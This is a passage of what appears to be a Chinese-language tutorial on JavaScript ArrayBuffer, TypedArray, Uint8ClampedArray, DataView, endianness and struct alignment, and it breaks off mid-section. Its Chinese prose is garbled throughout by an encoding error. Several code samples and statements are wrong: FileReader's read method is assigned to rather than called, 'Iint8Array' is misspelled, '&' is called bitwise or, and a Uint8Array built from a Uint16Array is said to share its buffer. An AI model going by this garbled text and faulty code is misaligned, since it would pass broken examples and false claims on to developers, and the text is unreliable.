ArrayBufferArrayBuffer ä»£è¡¨ä¸€æ®µå›ºå®šå¤§å°çš„è¨˜æ†¶é«”å€å¡Šï¼Œä¹Ÿç¨±ç‚º byte-arrayã€‚ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯é…ç½®å¯¦é«”è¨˜æ†¶é«”ä¾†å„²å­˜ raw binary dataã€‚ä¸€èˆ¬å¾ˆå°‘ç›´æ¥æ“ä½œ ArrayBufferï¼Œå¯¦éš›ä¸Šä¹Ÿåªèƒ½å°‡å…¶ reference å‚³çµ¦å…¶ä»–ç‰©ä»¶ï¼Œè®“å…¶ä»–ç‰©ä»¶ä¾†è™•ç†ï¼ä½¿ç”¨è³‡æ–™ã€‚
å»ºç«‹ä¸€å€‹ ArrayBuffer æœ‰éå¸¸å¤šç¨®æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥é…ç½®ï¼Œ
// ç›´æ¥é…ç½® 8 bytesï¼Œåˆå§‹å€¼ç‚º 0 çš„è¨˜æ†¶é«”å€å¡Šconst buffer = new ArrayBuffer(8)// åˆ©ç”¨ `slice` å°‡æŸäº› bytes è¤‡è£½åˆ°å¦ä¸€å€‹ ArrayBuffer// é€™è£¡è¤‡è£½ `buffer` å€’æ•¸å››å€‹ bytes åˆ° bufferCopied ä¸­const bufferCopied = buffer.slice(-4)

æˆ–æ˜¯æœ€å¸¸ä½¿ç”¨çš„ï¼ŒHTTP response é¸æ“‡æ¥æ”¶ bufferï¼Œ
// XMLHttpRequest æŒ‡å®š resopnseType (XMLHttpRequest v2)const xhr = new XMLHttpRequest()xhr.open(&#x27;GET&#x27;, &#x27;/path/to/é»‘äººå•è™Ÿ.jpg&#x27;, true)xhr.responseType = &#x27;arraybuffer&#x27; // å°‡ reponse å‹åˆ¥è¨­å®šç‚º arraybufferxhr.onload = function(e) &#123;  console.log(this.response) // this.response ç‚º ArrayBuffer&#125;xhr.send()// Fetch API ä¹Ÿæä¾› Body#arrayBuffer çš„æ–¹æ³•è½‰æ› Requestï¼Response stream bodyconst response = await fetch(&#x27;/path/to/æŸ¯Pç«å½±.gif&#x27;)const buffer = await response.arrayBuffer() // å–å¾— ArrayBuffer å¯¦ä¾‹console.log(buffer.byteLength) // æŸ¥çœ‹ç•¶å‰é€™å€‹ ArrayBuffer æœ‰å¤šå°‘ bytesã€‚

ç•¶ç„¶ï¼Œä¹Ÿå¯ä»¥é€é File èˆ‡ FileReader APIï¼Œè®€å–ä½¿ç”¨è€…ä¸Šå‚³çš„è³‡æ–™ã€‚
const input = document.querySelector(&#x27;input&#x27;)input.addEventListener(&#x27;change&#x27;, handleFiles, false);function handleFiles (files) &#123; // files -&gt; FileList ç‰©ä»¶ï¼Œè£¡é¢æœ‰ File å¯¦ä¾‹  if (files[0]) &#123;    const reader = new FileReader()    reader.onload = function (&#123; target: &#123; result &#125; &#125;) &#123;      console.log(result.byteLength) // result æ˜¯ä¸€å€‹ ArrayBuffer    &#125;    reader.readAsArrayBuffer = files[0] // File æ˜¯ç‰¹æ®Šçš„ Blob å‹åˆ¥  &#125;&#125;

TypedArrayTypedArray ä¸¦éä»»ä½•ä¸€å€‹å‹åˆ¥ï¼Œä¹Ÿéå…¨åŸŸå¯å–å¾—çš„å»ºæ§‹å‡½æ•¸ï¼Œè€Œæ˜¯ä¸€å€‹æŠ½è±¡æ¦‚å¿µï¼Œå°æ‡‰åˆ°è¨±å¤šä¸åŒå‹åˆ¥çš„ Array ç½·äº†ã€‚è€å¯¦èªªï¼ŒTypedArray é€™å€‹çš„å‘½åå·²èªªæ˜ä¸€åˆ‡ï¼Œè®“æˆ‘ä¾†èªªæ–‡è§£å­—ï¼Œå…ˆå¾ Typed è¬›èµ·ã€‚
Types of TypedArrayæ‰€è¬‚çš„ Typedï¼Œæ„æŒ‡ã€Œé™å®šå‹åˆ¥ã€ï¼ŒArray ä¸­çš„å…ƒç´ éƒ½æ˜¯åŒä¸€ç¨®å‹åˆ¥ã€‚æœ‰å“ªäº›å‹åˆ¥å‘¢ï¼ŸTypedArray æ˜¯ç‚ºäº†æ“ä½œ binary è€Œç”Ÿï¼Œç•¶ç„¶åªæœ‰æœ€åº•å±¤ä»¥ bytes ç‚ºåŸºç¤ï¼Œå¹¾ä¹æ²’æœ‰ä»€éº¼æŠ½è±¡æ¦‚å¿µçš„å‹åˆ¥ã€‚æˆ‘å€‘å¯æ ¹æ“šéœ€æ±‚ï¼Œæ±ºå®šæ¯å€‹å…ƒç´ è©²å¾ raw data è®€å–å¤šå°‘èˆ‡å¦‚ä½•è®€å– bytesã€‚
ç›®å‰ ES6 å®šç¾©ä»¥ä¸‹å¹¾ç¨® typed array typesï¼š



å‹åˆ¥
bytesï¼å…ƒç´ 
å°æ‡‰ C èªè¨€



Int8Array
1
int8_t


Uint8Array
1
uint8_t


Uint8ClampedArray
1
uint8_t


Int16Array
2
int16_t


Uint16Array
2
uint16_t


Int32Array
4
int32_t


Uint32Array
4
uint32_t


Float32Array
4
float


Float64Array
8
double


å¯¦éš›ä¸Šï¼ŒTypedArray æœ¬èº«ä¸¦ä¸¦ä¸å„²å­˜ä»»ä½• buffer è³‡æ–™ï¼Œåªä¿å­˜è©² buffer çš„ referenceï¼Œæˆ‘å€‘å¯ä»¥é€é TypedArray#buffer ç²å–åŸå§‹çš„ ArrayBufferã€‚ä¹Ÿå› æ­¤ï¼ŒåŒä¸€å€‹ ArrayBuffer å¯ä»¥å»ºæ§‹å‡ºå¤šå€‹ä¸åŒçš„ TypedArrayã€‚å¯è¦–ç‚ºã€Œå¾ä¸åŒè¦–è§’è§£è®€ ArrayBuffer ä¸­çš„ binary dataã€ã€‚
ä¾‹å¦‚ä¸‹åœ–æ˜¯ä¸€å€‹ 16 bytes çš„ ArrayBufferï¼Œæˆ‘å€‘å¯ä»¥é€éå®ƒï¼Œå»ºç«‹å¤šå€‹ä¸åŒå‹åˆ¥çš„ TypedArrayã€‚

ä¸åŒå‹åˆ¥çš„ TypedArray çš„å…ƒç´ å°æ‡‰åˆ°ä¸åŒçš„ byte æ•¸é‡ï¼Œé€™é …è³‡è¨Šæœƒè¨˜éŒ„åœ¨ TypedArray#BYTES_PER_ELEMENT property ä¸Šã€‚ä¾‹å¦‚ï¼šUint8Array ä¸€å€‹å…ƒç´ å°æ‡‰åˆ°ä¸€å€‹ byteï¼ŒFloat64Array å‰‡å°æ‡‰åˆ° 8 bytesã€‚
å¦‚æœé‚„æ˜¯ç„¡æ³•ç†è§£ï¼Œå…¶å¯¦å¯ä»¥å°‡ TypedArray æƒ³åƒç‚º C èªè¨€çš„ void *ptrï¼Œåœ¨å­˜å–ã€éæ­·ä¸åŒ data type çš„ Array æ™‚ï¼Œè½‰å‹ï¼ˆcastï¼‰æˆä¸åŒçš„å‹åˆ¥ï¼Œè®“æŒ‡æ¨™æ ¹æ“šä¸åŒ data type çš„ size åšå°æ‡‰ offsetã€‚
Array-like Methodsè€Œ TypedArray ä¸­çš„ Arrayï¼Œå…¶å¯¦å°±æ˜¯æˆ‘å€‘ç†Ÿæ‚‰çš„ JavaScript Arrayï¼Œå¯è¦–ç‚ºã€Œåœ¨ ArrayBuffer çš„è³‡æ–™ä¹‹ä¸Šï¼Œæ¶ä¸€å±¤å¯å­˜å–è³‡æ–™çš„ Array APIã€ã€‚ä½ æƒ³å¾—åˆ°çš„ method mapã€filterã€reduce å¹¾ä¹æ‡‰æœ‰ç›¡æœ‰ï¼Œè€Œ pushã€shiftã€unshiftã€splice é€™é¡æœƒæ”¹è®Š Array é•·åº¦çš„ Mutator methods æ²’æœ‰å¯¦ä½œï¼Œç•¢ç«Ÿ TypedArray å°±åªæ˜¯ buffer çš„ referenceï¼Œpop å¾ŒåŸå§‹è³‡æ–™ä¾ç„¶å­˜åœ¨ã€‚
æ¯”è¼ƒå¥½ç©çš„æ˜¯ï¼ŒTypedArray#subarray å’Œ TypedArray#slice åŒæ¨£æ˜¯å›å‚³é™£åˆ—åˆ‡ç‰‡ï¼Œslice æ˜¯å›å‚³ä¸€å€‹æ·ºæ‹·è²ï¼ˆshallow-copyï¼‰çš„æ–° Arrayï¼Œæ–° array çš„ buffer property æŒ‡å‘æ–°åˆ‡å‡ºä¾†çš„ bufferï¼ŒbyteOffset ä¹Ÿæ˜¯ä¾æ“šæ–°çš„ bufferï¼Œæ‰€ä»¥æœƒæ˜¯ 0ã€‚
è€Œ subarray å‰‡æ˜¯åœ¨åŒå€‹ buffer ç¹¼çºŒåˆ‡ç‰‡ï¼Œèª¿ç”¨ subarray çš„ buffer æœƒå–å¾—ç›¸åŒçš„åŸå§‹ bufferï¼ŒbyteOffset ä¹Ÿæ˜¯æ ¹æ“šåŸå§‹ buffer è¨ˆç®— offsetã€‚
Consturct a TypedArrayå»ºæ§‹ TypedArray éå¸¸ç°¡å–®ï¼Œé¸æ“‡å¥½ data type ä¹‹å¾Œï¼Œnew ä¸€å€‹å°±å®Œæˆäº†ï¼
ç›´æ¥åˆå§‹åŒ–
å»ºç«‹ä¸€å€‹ 4 * 2 bytes åˆå§‹å€¼ç‚º 0 çš„ Uint16Arrayã€‚
const u16 = new Uint16Array(4)

å¾ TypedArray å»ºç«‹
æˆ‘å€‘ä¹Ÿå¯ä»¥å¾å…¶ä»– TypedArray å»ºç«‹ç›¸åŒé•·åº¦çš„ TypedArrayï¼ŒæœƒæŒ‡å‘åŒä¸€å€‹ bufferã€‚
const u8 = new Uint8Array(u16) // length of u8 is 4

é€™æ¨£æœƒå»ºç«‹ä¸€å€‹æ–°çš„å‹åˆ¥ arrayï¼Œä½†è¨˜æ†¶é«”å€å¡Šä¸è®Šã€‚æˆ‘å€‘çš„ä¾‹å­ä¸­ï¼Œu8 å› ç‚ºæº¢ä½çš„ç·£æ•…ï¼ˆoverflowï¼‰ï¼Œè‡ªå‹•éæ¿¾å¶æ•¸ bytesï¼ˆæˆ–å¥‡æ•¸ï¼Œè¦– endianness è€Œå®šï¼‰ï¼Œåƒ…é¡¯ç¤ºé¤˜ä¸‹ 4 å€‹ bytes çš„è³‡æ–™ï¼Œè¨˜æ†¶é«”ä½å€è®Šå¾—ä¸é€£çºŒã€‚
å¾ ArrayBuffer å»ºç«‹
ä¸éï¼Œä¹Ÿå¯ä»¥é€é TypedArray#buffer å–å¾—ä¸¦å…±äº«ç•¶å‰çš„ bufferï¼Œè©² array çš„è¨˜æ†¶é«”å€é–“å°±æœƒæ˜¯é€£çºŒçš„ã€‚
// å› ç‚º buffer ç¸½å…±æœ‰ 4 * 2 = 8 bytesï¼Œæ‰€ä»¥ u8_continuous é•·åº¦ç‚º 8const u8_continuous = new Uint8Array(u16.buffer)

ç•¶ç„¶ï¼ŒArrayBuffer å¯ç›´æ¥é…ç½®ä¸€å¡Šè¨˜æ†¶é«”å€å¡Šï¼Œä¸¦ä½¿ç”¨å®ƒå»ºæ§‹ TypedArrayï¼Œç”šè‡³é€é length å’Œ byteOffset æŒ‡å®šè©² buffer ä¸åŒçš„å€é–“ä¾†å»ºæ§‹ã€‚
const buffer = new ArrayBuffer(16)const i32 = new Int32Array(buffer) // 32 * 2 bytes// å¾ 4 bytes offset çš„ä½å€é–‹å§‹ï¼Œåˆ‡ä¸€å€‹é•·åº¦ç‚º 7 bytes çš„ arrayã€‚const i8 = new Iint8Array(buffer, 4, 7)

Overflowå¦‚åŒ C èªè¨€ï¼Œä¸åŒé¡å‹çš„ TypedArray å¯ä»¥å®¹ç´çš„ bytes ç¯„åœæ˜¯å›ºå®šçš„ï¼Œè¶…éæ­¤ä¸€ç¯„åœï¼Œå°±æœƒå‡ºç¾ã€Œæº¢ä½ï¼ˆOverflowï¼‰ã€ï¼Œä¾‹å¦‚ Uint8Array ä¸­åƒ…èƒ½æ”¾å…¥ 1 byte &#x3D; 8 bits çš„è³‡æ–™ï¼Œå¦‚æœæ”¾å…¥ 0x100ï¼ˆ256ï¼Œ9 bitsï¼‰ï¼Œå°±æœƒæº¢ä½ã€‚
é‚£æº¢ä½å¾Œï¼Œè³‡æ–™æœƒæ€éº¼å‘ˆç¾å‘¢ï¼Ÿ
æ¯å€‹èªè¨€å¯¦ä½œä¸ç›¡ç›¸åŒï¼ŒTypedArray çš„æº¢ä½è™•ç†è¦å‰‡å’Œå¤šæ•¸èªè¨€ç›¸åŒï¼šæ¨æ£„æº¢å‡ºçš„ high bitsã€‚ æˆ‘å€‘ä¾†çœ‹ç°¡å–®çš„ä¾‹å­ã€‚
Uint8Array.of(0xff, 0x100)// Unit8Array [255, 0]

ç¬¬ä¸€å€‹ä¾‹å­ä¸­ï¼Œæˆ‘å€‘é¸ç”¨ Uint8Arrayï¼Œä¸€å€‹å…ƒç´ æœ€å¤šå„²å­˜ 8 bits çš„è³‡æ–™ï¼Œç¬¬äºŒå€‹å…ƒç´ æ˜¯ 256ï¼Œéœ€è¦ç¬¬ 9 bit ä¾†å„²å­˜ï¼Œå› æ­¤æº¢ä½ã€‚
// 255ï¼Œè‡³å°‘éœ€è¦ 8 bits å„²å­˜0b11111111// 256ï¼Œè‡³å°‘éœ€è¦ 9 bits å„²å­˜0b100000000//â””â”€â”€ é€™å€‹ 1 æº¢ä½ï¼Œå°‡è¢«æ¨æ£„ï¼Œåƒ…ä¿ç•™æœ€ä½æœ‰æ•ˆçš„ 8 bitsï¼Œè¨ˆç®—çµæœç‚º `0`// æ¨æ£„çš„æ–¹å¼åŒæ–¼ bitwise or `&amp; 0xFF`0x100 &amp; 0xFF// 0


Noteï¼šunderflow çš„è™•ç†æ–¹å¼èˆ‡ overflow ç›¸åŒã€‚

What is Uint8ClampedArrayClamp çš„æœ¬æ„æ˜¯é‰—å­ï¼Œåœ¨è¨ˆç®—æ©Ÿç§‘å­¸ä¸­ï¼Œé€šå¸¸æ„å‘³å°‡è³‡æ–™å€¼é™åˆ¶åœ¨ç‰¹å®šç¯„åœé–“ã€‚è€Œ Uint8ClampedArray ä¸­ï¼Œå°±æ˜¯å°‡å…ƒç´ å€¼é™åˆ¶åœ¨ 0 - 255ã€‚æ›å¥è©±èªªï¼Œå°±æ˜¯è™•ç†æº¢ä½çš„è¦å‰‡èˆ‡ Uint8Array ä¸åŒã€‚ç•¶ overflow æ™‚ï¼Œè©²å€¼æœƒç­‰æ–¼æœ€å¤§å€¼ 255ï¼›ç•¶ underflow æ™‚ï¼Œè©²å€¼æœƒç­‰æ–¼ 0ã€‚
Uint8Array.of(0xff, 0x100, -100)// Unit8Array [255, 0, 156]Uint8ClampedArray.of(0xff, 0x100, -100)// Uint8ClampedArray [255, 255, 0]

é€™æœ‰ä»€éº¼å¥½è™•å‘¢ï¼Ÿåœ¨å½±åƒè™•ç†ä¸Šéå¸¸æ–¹ä¾¿ã€‚æœ‰å€‹å¾ˆå¸¸èˆ‰çš„ä¾‹å­ï¼Œæœ‰ 3 bytes çš„ Uint8Array å­˜æ”¾ RGB è‰²ç¢¼ï¼Œæˆ‘å€‘æƒ³è¦å¢åŠ ä»–çš„ gamma factorï¼Œå¦‚æœä½¿ç”¨ Uint8Array å„²å­˜ï¼š
// å¿…é ˆè‡ªè¡Œé™åˆ¶å¤§å°ï¼Œé˜²æ­¢ ooverflowï¼underflowã€‚u8[i] = Math.max(0, Math.min(255, u8[i] * gamma)) // u8 æ˜¯ä¸€å€‹ Uint8Array

å¦‚æœæ˜¯ Uint8ClampedArrayï¼Œåªéœ€è¦ç›´æ¥ä¹˜ä¸Š gammer factorï¼Œéå¸¸æ–¹ä¾¿ã€‚
pixels[i] *= gamma // pixels æ˜¯ä¸€å€‹ Uint8ClampedArray

Composite Data Structureç•¶éœ€è™•ç†é¡ä¼¼ C struct çš„è¤‡åˆè³‡æ–™çµæ§‹ï¼Œå¦‚ä¸‹æ‰€ç¤º
struct employee &#123;  unsigned int id;               // 4 * 1 bytes  unsigned char department[4];   // 1 * 4 bytes  float salary;         // 4 * 1 bytes&#125;;

æˆ‘å€‘å¯ä»¥å®£å‘Šå°æ‡‰çš„ TypedArray ä¾†è™•ç†ã€‚æ¨¡æ“¬å‡ºå¦‚æœ C struct çš„è³‡æ–™çµæ§‹ã€‚
const buffer = new ArrayBuffer(12)const idView = new Uint32Array(buffer, 0, 1)const deptView = new Uint8Array(buffer, 4, 4)const salaryView = new Float32Array(buffer, 8)idView[0] = 123deptView.forEach((_, i) =&gt; &#123; deptView[i] = i * i &#125;)salaryView[0] = 10000

DataViewé¡§åæ€ç¾©ï¼ŒDataView æ˜¯ä¸€ç¨®å»ºæ§‹åœ¨ buffer ä¹‹ä¸Šçš„ viewã€‚èˆ‡ä¸€èˆ¬ TypedArray ä¸åŒçš„æ˜¯ï¼Œå»ºæ§‹ DataView æ™‚ä¸¦ä¸æœƒå›ºå®šçš„è³‡æ–™å‹åˆ¥ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å­˜å– data æ™‚ï¼Œå¿…é ˆæ˜ç¢ºçš„æŒ‡å®šå¾å“ªå€‹ byte offset å–å“ªä¸€ç¨® data type å‡ºä¾†ã€‚
å€Ÿç”¨å‰ä¾‹çš„è¤‡åˆè³‡æ–™ä¾†ç¤ºç¯„ï¼ŒDataView å¦‚ä½•é‡å°æ¯å€‹ bytes è™•ç†è‡ªå®šç¾©çš„è³‡æ–™ã€‚
const dv = new DataView(buffer)// å¾ byte offset 0 çš„ä½å€é–‹å§‹å– Uint32 çš„è³‡æ–™// å–å¾— ID -&gt; 123dv.getUint32(0, true)// å¾ byte offset 8 çš„ä½å€é–‹å§‹å¯«å…¥ Float32 çš„è³‡æ–™dv.setFloat32(8, 200000, true)dv.getFloat32(8, true) // åŠ è–ªå›‰ï¼ï¼

å„ä½æœ‰æ²’æœ‰æ³¨æ„åˆ°ï¼ŒDataView çš„ bytes getterï¼setter æœ€å¾Œé¢éƒ½å¤šå¸¶äº†ä¸€å€‹ boolean åƒæ•¸ï¼Ÿé€™å€‹åƒæ•¸æ˜¯æŒ‡å®šä½¿ç”¨ Little-endian è®€å–è³‡æ–™ï¼Œé è¨­ç‚º false ä¹Ÿå°±æ˜¯ä»¥ Big-endian è®€å–ã€‚å¯æ§åˆ¶ endian æ˜¯ DataView è »é‡è¦ä½†ä¹Ÿé —æƒ±äººçš„ç‰¹æ€§ï¼Œåœ¨ä¸‹ä¸€ç¯€æœƒä»‹ç´¹ Endiannessã€‚
DataView å¦ä¸€å€‹é‡è¦ç‰¹æ€§å°±æ˜¯ä¸æœƒ buffer overflowï¼Œæ‰€è¬‚çš„ buffer overflow æ˜¯ã€Œç•¶å¯«å…¥ä¸€ç­†è³‡æ–™åˆ°æŒ‡å®š buffer ä¸­ï¼Œè‹¥å¯«å…¥çš„è³‡æ–™å¤§å°è¶…éè©² buffer çš„ boundaryï¼Œæº¢å‡ºå€¼å°±æœƒè¦†å¯«ä¸‹å€‹ byteã€ã€‚é€™ç¨®ä¸å®‰å…¨çš„æ€§è³ªï¼Œä¹Ÿè®“ buffer overflow æˆç‚ºè¨±å¤šé§­å®¢çš„æ”»æ“Šæ‰‹æ³•ï¼Œæœ‰æ½›åœ¨çš„å®‰å…¨æ€§å•é¡Œã€‚è€Œé€é DataView setter è³¦äºˆä¸€å€‹è¶…éå‹åˆ¥æœ€å¤§å€¼çš„æ•¸å­—ï¼Œä¸¦ä¸æœƒè¦†è“‹è‡¨è¿‘è¨˜æ†¶é«”ä½å€çš„è³‡æ–™ï¼Œè€Œæ˜¯å…§éƒ¨å…ˆæª¢æŸ¥é‚Šç•Œï¼Œè™•ç† overflow ä¹‹å¾Œï¼Œå†å¯«å…¥è©²è¨˜æ†¶é«”å€é–“ï¼Œå½Œè£œäº† buffer overflow çš„æ¼æ´ã€‚
PrecautionsTyped Arrays å¹¾ä¹å¯ä»¥åšåˆ°å¦‚åŒ C èªè¨€èˆ¬ç´°è†©çš„è¨˜æ†¶é«”æ“ä½œã€‚ä¸éè¶Šæ˜¯è‡ªç”±çš„ APIï¼Œå°±ä»£è¡¨è¦å­¸ç¿’æ›´å¤šçŸ¥è­˜ï¼Œæ³¨æ„æ›´å¤šç´°ç¯€ï¼Œä»¥ä¸‹æ˜¯æ“ä½œ TypedArray è©²éŠ˜è¨˜åœ¨å¿ƒçš„äº‹æƒ…ï¼š

Endianness (Byte order)
Data Structure Alignment

Endianness (Byte order)åœ¨è¨ˆç®—æ©Ÿç§‘å­¸é ˜åŸŸä¸‹ï¼ŒData æ˜¯ä¸€å€‹ç‰©ç†æ¦‚å¿µï¼ŒæŒ‡å„²å­˜åœ¨é›»è…¦è¨˜æ†¶é«”ä¸Šçš„ä¸€å€‹ bitsï¼bytes åºåˆ—ã€‚Data æœ¬èº«ä¸¦æ²’æœ‰ä»»ä½•æ„ç¾©ï¼Œæƒ³ä½¿ç”¨å®ƒï¼Œå¿…é ˆè‡ªè¡Œè§£è®€å‡ºæŠ½è±¡çš„æ„ç¾©ï¼Œä¾‹å¦‚å°‡ Data è®€å–ç‚ºå­—ä¸²æˆ–æ•¸å­—ã€‚
æˆ‘å€‘çŸ¥é“è¨˜æ†¶é«”æ˜¯åŸºæ–¼ä½å€ï¼ˆaddressï¼‰ä¾åºå„²å­˜ Dataï¼Œæ¯å€‹ä½å€å¯ä»¥å­˜ä¸Š 1 byte dataã€‚å¦‚æœä½¿ç”¨ Uint8Array é€™ç¨®ä¸€æ¬¡å­˜å–ä¸€å€‹ byte çš„æ ¼å¼ï¼Œé‚£éº¼å®Œå…¨ä¸æœƒæœ‰ä»»ä½•å•é¡Œï¼Œæ€éº¼å­˜å–ï¼Œéƒ½æ˜¯ä¾é€£çºŒçš„è¨˜æ†¶é«”ä½å€é †åºï¼š
--- è³‡æ–™è®€å–é †åº --&gt;| Offset | 0    | 1    | 2    | 3    || ------ | ---- | ---- | ---- | ---- || Data   | 0x11 | 0x22 | 0x33 | 0x44 |

æˆ‘å€‘æœƒå¾—åˆ° [17, 34, 51, 68] çš„ Arrayã€‚
ç•¶æˆ‘å€‘éœ€è¦ä¸€æ¬¡å­˜å–å¤š bytesï¼Œä¾‹å¦‚é€™å€‹ç¯„ä¾‹çš„è¨˜æ†¶é«”å€å¡Šå…¶å¯¦æ˜¯ä¸€å€‹ 32 bit çš„æ•´æ•¸ï¼Œé‚£å¯¦éš›ä»£è¡¨çš„æ•¸å­—æœƒæ˜¯å¤šå¤§ï¼Ÿæ˜¯ 0x11223344ï¼ˆåé€²ä½ï¼š287454020) å—ï¼Ÿ
é€™å…¶å¯¦ç‰½æ‰¯åˆ° CPU çš„è¨­è¨ˆï¼Œç›®å‰å¸‚é¢ä¸Šçš„å¤šæ•¸ CPU è™•ç† multi-bytes çš„è³‡æ–™æ™‚ï¼Œå¤§å¤šå¾ã€Œæœ€ä½æœ‰æ•ˆä½ï¼ˆLSBï¼Œleast significant byteï¼‰ã€ï¼Œä¹Ÿå°±æ˜¯å¾æ¬Šé‡æœ€å°çš„ä½æ•¸é–‹å§‹å¯«å…¥ã€‚æ‰€ä»¥è®€å–é€™ç­†è³‡æ–™æ™‚ï¼Œæœ€å‰é¢çš„è¨˜æ†¶é«” offset å°±æ˜¯æœ€æ¬Šé‡æœ€å°çš„ bytesï¼Œæ‰€ä»¥æœ€å¾Œæœƒå¾—åˆ° 0x44332211ï¼ˆåé€²ä½ï¼š1144201745ï¼‰ã€‚é€™ç¨®å­˜å–æ’åºï¼Œæˆ‘å€‘ç¨±ä¹‹ç‚º Little-endianã€‚
æœ‰æœ€ä½ï¼Œç•¶ç„¶å°±æœ‰æœ€é«˜ï¼ŒBig-endian å‰‡æ˜¯å¾ã€Œæœ€é«˜æœ‰æ•ˆä½ï¼ˆMSBï¼Œmost significant byteï¼‰ã€é–‹å§‹å­˜å–ã€‚å› æ­¤ç…§è‘—è¨˜æ†¶é«”ä½å€ä¾åºè®€å–ï¼Œæœƒå¾—åˆ°è·Ÿè¨˜æ†¶é«” offset é †åºç›¸åŒçš„ 0x11223344ã€‚Big-endian é›–ç„¶åœ¨å€‹äººé›»è…¦ä¸­ä¸å¸¸è¦‹ï¼Œä½†è¨±å¤šç¶²è·¯å”è­°å’Œè¨­å‚™éƒ½æ˜¯æ¡ç”¨ Big-endian å­˜å–è³‡æ–™ï¼Œä½”æœ‰ä¸€å®šçš„é‡è¦æ€§ã€‚
Little-endian å’Œ Big-endian å¯ä»¥è¦–ç‚ºä¸åŒçš„é›»è…¦ï¼ˆCPUï¼‰è¬›ä¸åŒçš„èªè¨€ï¼Œä¸€å€‹å¾å³åˆ°å·¦ï¼Œå¦ä¸€å€‹å¾å·¦åˆ°å³ã€‚å…¶å¯¦åœ¨äººé¡æ—¥å¸¸ç”Ÿæ´»ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸åŒçš„ç¾è±¡ï¼Œä¾‹å¦‚æ­æ´²å¸¸ç”¨çš„æ—¥æœŸæ ¼å¼ç‚º day-month-yearï¼ŒISO åœ‹éš›æ¨™æº–å‰‡åä¹‹ year-month-dayï¼Œæ‰€ä»¥ï¼Œç•¶ä½ çœ‹åˆ°ä¸€å€‹ 17-09-07 çš„æ—¥æœŸæ™‚ï¼Œå¿…é ˆå…ˆåˆ¤æ–·æ˜¯å¦ç‚º ISO çš„æ¨™æº–ï¼Œæ‰èƒ½çŸ¥é“é€™å ´ç´„æœƒæ˜¯åœ¨ä¸‹ç¦®æ‹œçš„ä¹æœˆä¸ƒæ—¥ï¼ŒæŠ‘æˆ–ä½ éœ€è¦ä¸€å°æ™‚å…‰æ©Ÿå›åˆ°éå»ã€‚
Qï¼šé‚£åœ¨ JavaScipt è¦å¦‚ä½•è™•ç† endianï¼Ÿ
å¦‚æœä¸ç¢°åº•å±¤çš„è¨˜æ†¶é«”æ“ä½œï¼Œå¯« JavaScript æ˜¯ä¸ç”¨ç†æœƒ endianness çš„ï¼Œä½†ç•¶ä½ è¦æ“ä½œ TypedArray æ™‚ï¼Œäº†è§£ data çš„ endian å°±è‡³é—œé‡è¦äº†ã€‚TypedArray é è¨­æ˜¯ä½¿ç”¨ç³»çµ±çš„ endiannessï¼Œæ‰€ä»¥å¦‚æœä½ æ¥æ”¶ä¸€ç­†è³‡æ–™ï¼Œèˆ‡ä½ çš„ç³»çµ±çš„ endianness ä¸ä¸€è‡´ï¼ŒTypedArray ä¾¿ä½¿ä¸ä¸ŠåŠ›ã€‚è€Œå‰é¢ä»‹ç´¹åˆ° DataView çš„ byte getterï¼setter æœ€å¾Œä¸€å€‹åƒæ•¸å°±æ˜¯ç”¨ä¾†æ±ºå®šä»¥å“ªç¨® byte order å­˜å–è³‡æ–™ï¼Œé è¨­æ˜¯ Big-endianï¼ˆfalseï¼‰ï¼Œé€éåˆ‡æ›é€™å€‹ flagï¼Œä»»ä½• binary data éƒ½æ©«çœ‹æˆå¶ºå´æˆå³°äº†ã€‚
Qï¼šé‚£æˆ‘å€‘è¦å¦‚ä½•å¾—çŸ¥è³‡æ–™çš„ byte orderï¼Ÿ
å¦‚æœè³‡æ–™æ˜¯è‡ªå·±å®¶å…§éƒ¨ç³»çµ±ä½¿ç”¨ï¼Œå…¶å¯¦æºé€šå¥½å°± OKï¼Œç”¨ Mixed-endian ä¹Ÿä¸æœƒæœ‰äººç®¡ä½ ã€‚ä½†å¦‚æœæ˜¯å¤–ç•Œå¾—ä¾†çš„ä»»æ„è³‡æ–™ï¼Œæˆ‘å€‘å¯ä»¥é€éã€ŒBOMï¼ˆbyte order markï¼‰ã€ä¾†åˆ¤æ–·è³‡æ–™å±¬æ–¼å“ªç¨® endiannessã€‚BOM æ˜¯ä¸€å€‹ Unicode  magic numberï¼Œé€šå¸¸æ”¾ç½®åœ¨ text stream çš„æœ€å‰ç«¯ã€‚ä¸éï¼Œä¸¦ä¸æ˜¯æ¯å€‹è³‡æ–™éƒ½æœƒåŠ ä¸Šé€™å€‹ headerï¼Œè€Œä¸”æœ‰æ™‚å€™æˆ‘å€‘ä¸éœ€è¦ BOM è³‡è¨Šï¼Œä½¿ç”¨è³‡æ–™å‰é‚„å¿…é ˆå…ˆ strip bomï¼Œèªªå¯¦è©±æŒºéº»ç…©çš„ã€‚
Data Structure Alignmentè¦æ¥è§¸åº•å±¤çš„è¨˜æ†¶é«”ï¼Œå…ä¸äº†ç­è§£ CPU å¦‚ä½•å¾è¨˜æ†¶é«”ä¸­è®€å–è³‡æ–™ï¼Œè¨˜æ†¶é«”åº•å±¤åˆ°åº•å¦‚ä½•é…ç½®ã€‚
ä¸€èˆ¬ä¾†èªªï¼Œç¾ä»£çš„ CPU é€šå¸¸è¨­è¨ˆä»¥ word ç‚ºå–®ä½ï¼ˆä¾‹å¦‚ 4 bytesï¼‰è®€å¯«è¨˜æ†¶é«”è£¡çš„è³‡æ–™ï¼Œè€Œè³‡æ–™å°é½Šï¼ˆdata aligmentï¼‰å‰‡æ˜¯å°‡è³‡æ–™æ”¾ç½®åœ¨ word-size * n å€çš„è¨˜æ†¶é«”ä½å€ä¸Šï¼Œä½¿ CPU ä»¥æœ€ç‚ºæœ‰æ•ˆç‡çš„æ–¹å¼è®€å¯«ã€‚é‚£ç‚ºä»€éº¼å°é½Š word-size æœƒæœ€æœ‰æ•ˆç‡å‘¢ï¼Ÿå‡è¨­æœ‰å€‹ C struct å¦‚ä¸‹ï¼š
struct AlignDemo &#123;  char c;     // 1 byte  int i;      // 4 bytes  short s;      // 2 bytes&#125;;

ç†è«–ä¸Šçš„è¨˜æ†¶é«”é…ç½®å¦‚ä¸‹ï¼Œç¸½å…±éœ€è¦ 7 bytes çš„è¨˜æ†¶é«”ç©ºé–“ã€‚
c = char æ‰€ä½”çš„ bytes = short æ‰€ä½”çš„ bytei = int æ‰€ä½”çš„ byte| 0x000           | 0x020           || [c] [i] [i] [i] | [i] [s] [s] [ ] |

